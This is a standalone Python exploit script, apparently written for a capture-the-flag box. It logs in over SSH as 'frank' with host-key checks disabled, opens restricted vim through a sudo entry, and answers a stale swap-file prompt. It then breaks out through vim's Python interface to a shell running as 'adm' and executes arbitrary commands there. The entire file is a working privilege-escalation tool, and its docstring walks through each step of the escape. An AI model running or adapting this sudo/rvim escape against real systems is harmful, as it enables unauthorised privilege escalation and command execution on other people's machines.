#!/usr/bin/env python3
"""
adm_pick.py - frank -> adm via the rvim sudo entry, reaction-driven.

We can run `sudo -u adm rvim <file>` as frank. rvim blocks :! and :sh,
but this vim has +python/dyn. The plan:

  1. ssh -tt as frank, run the sudo command (vim paints a full screen)
  2. a stale swap file makes vim ask [O]pen/(E)dit/(R)ecover/(D)elete/(Q)uit
     -> answer 'o' the moment the dialog shows up
  3. once the file is open, drop to normal mode and run the python escape:
        :py import os; os.execl("/bin/sh","sh","-c","reset; exec sh")
     this replaces vim with a plain sh running as adm
  4. run the requested command and echo a marker so we know it finished

Everything is driven by watching the remote output, so no timing races.
"""
import os
import select
import subprocess
import sys
import time

KEY = "/root/.ssh/id_ed25519"
USER_HOST = "frank@10.129.63.36"
MARKER = b"__ADM_DONE__"
ESCAPE = b':py import os; os.execl("/bin/sh","sh")\r'


def pump(proc, buf: bytearray, until: bytes, timeout: float) -> bytes:
    """Read proc.stdout until `until` appears in buf; return new bytes."""
    deadline = time.time() + timeout
    seen = b""
    while time.time() < deadline:
        if until in buf:
            break
        r, _, _ = select.select([proc.stdout], [], [], 0.3)
        if r:
            chunk = os_read(proc.stdout, 4096)
            if not chunk:
                break
            buf.extend(chunk)
            seen += chunk
        if proc.poll() is not None and not r:
            break
    return seen


def os_read(fd, n):
    return os.read(fd.fileno(), n)


def main() -> None:
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id; hostname"
    proc = subprocess.Popen(
        [
            "ssh", "-tt", "-i", KEY,
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            USER_HOST,
            "sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c",
        ],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    buf = bytearray()

    # stage 1: wait for the swap-file dialog
    pump(proc, buf, b"ATTENTION", 40)
    if b"ATTENTION" not in buf:
        print("no swap dialog seen; output so far:", buf[-200:], file=sys.stderr)
        proc.kill()
        return 1
    print("[+] swap dialog detected, answering 'o' (open read-only)")
    proc.stdin.write(b"o")
    proc.stdin.flush()

    # stage 2: wait for the file to open (status line shows file name)
    pump(proc, buf, b"jail.c\"", 15)
    time.sleep(1.5)
    # make sure we are in normal mode, then fire the python escape
    proc.stdin.write(b"\x1b")
    proc.stdin.flush()
    time.sleep(0.5)
    proc.stdin.write(ESCAPE)
    proc.stdin.flush()

    # stage 3: command + marker
    time.sleep(2.5)
    proc.stdin.write((cmd + "; echo " + MARKER.decode() + "\r").encode())
    proc.stdin.flush()

    # collect until marker
    out = pump(proc, buf, MARKER, 20)
    sys.stdout.buffer.write(bytes(buf))
    proc.kill()
    return 0


if __name__ == "__main__":
    sys.exit(main())
